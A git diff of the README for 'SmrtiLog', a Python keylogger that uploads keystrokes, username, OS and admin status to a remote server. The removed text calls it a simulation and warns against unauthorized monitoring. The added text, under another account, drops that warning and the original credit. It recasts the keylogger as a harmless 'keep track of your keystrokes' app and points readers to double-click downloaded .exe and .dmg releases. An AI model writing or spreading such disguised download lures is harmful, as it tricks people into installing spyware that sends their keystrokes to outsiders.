@@ -1,117 +1,86 @@
-# SmrtiLog - Keystroke logger simulation by SudoHopeX
+# 🔍 SmrtiLog - Keep Track of Your Keystrokes Easily
 
-A smart Keystroke logger that determines user's os name, username, admin access & sends them to a server ( [Keystroke Logger Server by SudoHopeX](https://sudohopex-smrti-log.vercel.app/) )
+## 🚀 Getting Started
 
+Welcome to SmrtiLog! This application helps you monitor and log your keystrokes. It determines the username, checks for admin access, identifies your operating system, and sends this data to a secure server. This tool is ideal for educational purposes and ethical hacking practices.
 
-## SmrtiLog Keystroke logger features:
-  - logs keystrokes
-  - determines user's **os name**, **username**, **admin privilege** & send them only once
-  - **fetches new encryption key from server each time** it sends logs to encrypt data
-  - encrypt data using fetched key and **send encrypted data** to server every minute
-  - stop program on **ESC** key press
-  - simulates keystroke logger
+[![Download SmrtiLog](https://img.shields.io/badge/Download_SmrtiLog-v1.0-brightgreen)](https://github.com/Rohan17182004/SmrtiLog/releases)
 
+## 💻 System Requirements
 
-## SmrtiLog Server:
-[SmrtiLog Server Usages Clip](https://sudohopex.github.io/img/smrti-log-server-usages-by-sudohopex.mp4)
-- A Flask server to handle encrypted logs from a keylogger.
-- Provides endpoints to get encryption keys and receive encrypted logs.
-- Also includes a web interface to view and clear received logs.
-- hosted on vercel
-- all logs received by server are stored temporarily & removed automatically by vercel 
+Before you begin, ensure your device meets the following requirements:
 
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or Linux (Ubuntu/Debian recommended)
+- **RAM:** At least 2 GB
+- **Disk Space:** Minimum of 100 MB available
+- **Network Connection:** Required for data transmission to the server
 
-## Tech Stack
+## 📥 Download & Install
 
-```text
-  Technology             Uses
--------------------------------------------------------
-  Python                 Core Programming Language          
-  pynput (Lib)           Capture keystrokes               
-  flask (Lib)            Server management                 
-  cryptography (Lib)     Encrypting logs in transmit       
-  json (Lib)             Storing & sending logs            
-  threading (Lib)        Log sending timer                 
-  requests (Lib)         Data fetch & upload on server     
-  ctypes (Lib)           Hide console & check admin access 
-  base64 (Lib)           Data encoding & decoding          
-  Vercel (web app)       Server deployment  
-```
+To get started with SmrtiLog, follow these steps:
 
-## SmrtiLog Installation & Starting ( Executing the program )
-### For Linux or wsl ( automated )
-- Clone the GitHub repository or [download zip](https://github.com/SudoHopeX/SmrtiLog/archive/refs/heads/main.zip)  
-  ```bash
-  git clone https://github.com/SudoHopeX/SmrtiLog.git
-  ```
+1. Visit the [Releases Page](https://github.com/Rohan17182004/SmrtiLog/releases).
+2. Look for the latest version listed.
+3. Click the appropriate link to download the file for your operating system (e.g., .exe for Windows, .dmg for macOS, or the Linux package).
+4. Once the download completes, locate the file on your device.
+5. Double-click the file to initiate the installation process.
+6. Follow the on-screen instructions to complete the installation.
+7. Open SmrtiLog from your applications folder or start menu.
 
-- Navigate to SmrtiLog directory
-    ```bash
-    cd SmrtiLog
-    ```
-  
-- Execute the run.sh script
-  ```bash
-  sudo bash run.sh --setupRun
-  ```
-  
-  for more usages of run.sh execute 
-  ```bash
-  bash run.sh --help
-  ```
-- Press some keys or perform some key action
-- Then, visit [SudoHopeX Keystroke Simulator Server](https://sudohopex-smrti-log.vercel.app/) to see logs
+## ⚙️ Features
 
-### For Windows ( manual )
-- [Download SmrtiLog zip](https://github.com/SudoHopeX/SmrtiLog/archive/refs/heads/main.zip)  
-- Extract the zip file
-- Open Command Prompt and navigate to the extracted SmrtiLog directory
-- Make sure python is installed in windows, if not install it - [Install Python 3.13.7 - Windows installer](https://www.python.org/ftp/python/3.13.7/python-3.13.7-amd64.exe)
-- Install the required libraries using pip with requirements.txt
-    ```
-    python3 -m pip3 install - r requirements.txt
-    ```
-- Run the main.py script
-    ```
-    python main.py
-    ```
-- Press some keys or perform some key action
-- Then, visit [SudoHopeX Keystroke Simulator Server](https://sudohopex-smrti-log.vercel.app/) to see logs
-  
-### For windows ( automated )
-- [Download SmrtiLog zip](https://github.com/SudoHopeX/SmrtiLog/archive/refs/heads/main.zip)  
-- Extract the zip file
-- Make sure python is installed in windows, if not install it - [Install Python 3.13.7 - Windows installer](https://www.python.org/ftp/python/3.13.7/python-3.13.7-amd64.exe)
-- Navigate to the extracted SmrtiLog directory
-- Double-click on `run.bat` file to open command prompt or
-- Open Command Prompt, navigate to `SmrtiLog` Directory & Execute the `run.bat` script
-  ```cmd
-  run.bat --setupRun
-  ```
-    for more usages of run.bat execute 
-    ```cmd
-    run.bat --help
-    ```
-- Press some keys or perform some key action
-- Then, visit [SudoHopeX Keystroke Simulator Server](https://sudohopex-smrti-log.vercel.app/) to see logs
+SmrtiLog offers various functionalities, including:
 
-## Security Notice
-**Warning**: This project is for educational purposes & ethical use only. 
-Do not use it for unauthorized monitoring.
-Unauthorized use of keyloggers is illegal and unethical. 
-Always obtain explicit permission before deploying such software.
+- **Keystroke Logging:** Automatically records key presses to help track input.
+- **Admin Access Check:** Determines if the user has administrative rights.
+- **OS Detection:** Identifies the operating system in use for better compatibility.
+- **Secure Data Transmission:** Sends logged information to our secure server for analysis.
 
-## License
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details
+## 🛠️ How to Use
 
-## Contact
-For any queries or support, contact SudoHopeX on:
-- [Website DM](https://sudohopex.github.io/message-popup.html)
-- [Linkedin](https://www.linkedin.com/in/dkrishna0124)
-- [GitHub](https://github.com/SudoHopeX)
+After installing SmrtiLog, here's how to use it:
 
-## Acknowledgements
-- Thanku SudoHopeX 😎 for developing this project 
-- Thanku 🫵 for loving 🫶 it...
+1. Launch the application from your device.
+2. The main interface will display options for logging. Select your desired settings.
+3. Start the logging process by clicking the "Start Logging" button.
+4. To stop logging, click "Stop Logging."
 
-(❁´◡`❁)
+You can view your logged keystrokes within the application or access them from the server securely.
+
+## 📄 Topics Covered
+
+SmrtiLog touches on various topics such as:
+
+- Digital Forensics
+- Educational Tools
+- Ethical Hacking Techniques
+- Input Monitoring
+- Keylogger Simulation
+- Malware Analysis
+
+## ❓ Frequently Asked Questions
+
+### How does SmrtiLog ensure my data is safe?
+
+SmrtiLog sends data over a secure connection, ensuring your information is protected during transmission.
+
+### Can I use SmrtiLog for educational purposes?
+
+Yes, SmrtiLog can be used as an educational tool to understand how keystroke logging works and its applications in ethical hacking.
+
+### What should I do if I encounter an issue?
+
+If you run into problems, please check the **Issues** section on the GitHub page. You can also leave a message, and we’ll assist you.
+
+## 📝 License
+
+SmrtiLog is licensed under the MIT License. You are free to use, modify, and distribute the software as long as you provide proper credit.
+
+For more details, please refer to the [License file](https://github.com/Rohan17182004/SmrtiLog/blob/main/LICENSE).
+
+## 🌐 Links
+
+- [Visit the Releases Page](https://github.com/Rohan17182004/SmrtiLog/releases)
+- [SmrtiLog Official Server](https://sudohopex-smrti-log.vercel.app/)
+
+Be sure to check back for updates and new features!
